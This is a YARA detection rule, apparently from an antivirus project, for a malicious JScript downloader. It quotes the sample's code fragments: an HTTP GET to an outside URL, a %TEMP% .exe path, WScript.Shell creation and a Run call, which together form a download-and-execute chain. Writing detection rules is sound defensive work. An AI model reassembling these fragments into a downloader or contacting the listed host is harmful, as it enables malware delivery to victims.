rule sig_20160329_364d52e8cca3011e6afb5478e66f52ee {
  meta:
    description = "datamaliciousorder - file 20160329_364d52e8cca3011e6afb5478e66f52ee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27427cbd96094e10ff68f6b3e1b5020ab48cc7bc2866752965f2a953254dcf58"

  strings:
    $s1  = "r0[SC](\"GET\", \"http://blog.insite.pt/m8djs\", false);" fullword ascii
    $s2  = "function d() {return wZ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oSisykTCRFAQC.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[d1](x() * 11); if (r0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function ut(GX, Hd){Cq = Cq * 1; return GX - Hd;};" fullword ascii
    $s5  = "var wZ = function V() {return WScript[Y](\"WScript.Shell\");}(), t = 11;" fullword ascii
    $s6  = "function HO(){return \"\" + d0;};" fullword ascii
    $s7  = "function we(d2){wZ[\"Run\"](d2, Cq, Cq);};" fullword ascii
    $s8  = "function Kw() {return ((i == true) && (i == Dr)) ? 1 : Cq;};" fullword ascii
    $s9  = "var e = new this[\"Date\"]();" fullword ascii
    $s10 = "function x(){return 22;};" fullword ascii
    $s11 = " while (b){" fullword ascii
    $s12 = "return ut(ql, rz);" fullword ascii
    $s13 = "function vq(){return Y;};" fullword ascii
    $s14 = "function OB(md) {var m = (1, 2, 3, 4, 5, md); return m;};" fullword ascii
    $s15 = "function Ra()" fullword ascii
    $s16 = "var Mn = false;" fullword ascii
    $s17 = "var i = false;" fullword ascii
    $s18 = "i = true; " fullword ascii
    $s19 = "Dr = true; " fullword ascii
    $s20 = "var Dr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}